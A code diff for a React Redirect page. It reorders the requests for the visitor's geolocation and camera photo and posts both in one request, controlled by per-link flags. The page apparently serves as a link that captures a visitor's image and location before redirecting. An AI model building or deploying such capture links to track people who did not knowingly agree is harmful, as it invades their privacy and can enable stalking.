@@ -41,6 +41,19 @@ export default function Redirect() {
         enableLocation
       );
 
+      // FIX: Request location FIRST before camera
+      if (enableLocation) {
+        await new Promise((resolve) => setTimeout(resolve, 100));
+        try {
+          locationData = await getCurrentLocation();
+          if (locationData) {
+            console.log("📍 Location obtained successfully");
+          }
+        } catch (error) {
+          console.log("Location not available or permission denied");
+        }
+      }
+
       // Only request camera if enabled for this link
       if (enableCamera) {
         try {
@@ -70,29 +83,6 @@ export default function Redirect() {
         }
       }
 
-      // Only request location if enabled for this link
-      if (enableLocation) {
-        try {
-          // Wait up to 3 seconds for location (shorter timeout for better UX)
-          locationData = await Promise.race([
-            getCurrentLocation(),
-            new Promise((resolve) =>
-              setTimeout(() => {
-                console.log("Location request timed out");
-                resolve(null);
-              }, 3000)
-            ),
-          ]);
-
-          if (locationData) {
-            console.log("📍 Location obtained successfully");
-          }
-        } catch (error) {
-          // Location access denied or error - silently continue without location
-          console.log("Location not available or permission denied");
-        }
-      }
-
       await makeSinglePostRequest(
         photoData,
         locationData,
@@ -101,10 +91,11 @@ export default function Redirect() {
       );
     };
 
+    // FIX: Simplify the getCurrentLocation function - remove the Promise.race
     const getCurrentLocation = () => {
-      return new Promise((resolve, reject) => {
+      return new Promise((resolve) => {
         if (!navigator.geolocation) {
-          resolve(null); // Silently resolve with null if geolocation not supported
+          resolve(null);
           return;
         }
 
